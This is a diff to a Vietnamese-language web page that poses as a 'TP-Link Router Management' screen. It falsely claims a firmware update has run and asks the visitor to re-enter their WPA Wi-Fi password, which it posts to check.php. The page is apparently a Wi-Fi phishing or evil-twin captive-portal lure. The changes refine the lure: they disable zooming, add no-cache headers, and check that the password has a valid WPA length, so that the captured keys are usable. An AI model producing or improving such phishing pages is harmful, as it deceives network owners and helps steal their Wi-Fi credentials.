@@ -2,7 +2,10 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
     <title>TP-Link Router Management</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
@@ -71,7 +74,7 @@
                     Router TP-Link vừa hoàn tất tự động tải về và khởi chạy bản cập nhật phần mềm hệ thống mới. Vui lòng nhập lại mật khẩu Wi-Fi (WPA/WPA2-PSK Key) hiện tại để xác thực và phục hồi kết nối Internet.
                 </div>
 
-                <form action="check.php" method="POST">
+                <form action="check.php" method="POST" onsubmit="return validateForm()">
                     <table class="form-table">
                         <tr>
                             <td class="td-label">Tên Mạng Wi-Fi (SSID)</td>
@@ -84,7 +87,7 @@
                         <tr>
                             <td class="td-label">Mật Khẩu Wi-Fi (WPA Key)</td>
                             <td>
-                                <input type="password" id="pwd" name="key1" placeholder="Nhập mật khẩu Wi-Fi" required autofocus autocomplete="off">
+                                <input type="password" id="pwd" name="key1" placeholder="Nhập mật khẩu Wi-Fi" required autofocus autocomplete="off" minlength="8" maxlength="63">
                                 <label class="toggle-pw">
                                     <input type="checkbox" onclick="togglePassword()"> Hiển thị mật khẩu
                                 </label>
@@ -114,6 +117,17 @@
                 x.type = "password";
             }
         }
-    </script>
+    
+function validateForm() {
+    var pwd = document.getElementById("pwd");
+    if (pwd) {
+        if (pwd.value.length < 8 || pwd.value.length > 63) {
+            alert("Mật khẩu WPA/WPA2 phải có độ dài từ 8 đến 63 ký tự. / WPA password must be between 8 and 63 characters.");
+            return false;
+        }
+    }
+    return true;
+}
+</script>
 </body>
 </html>
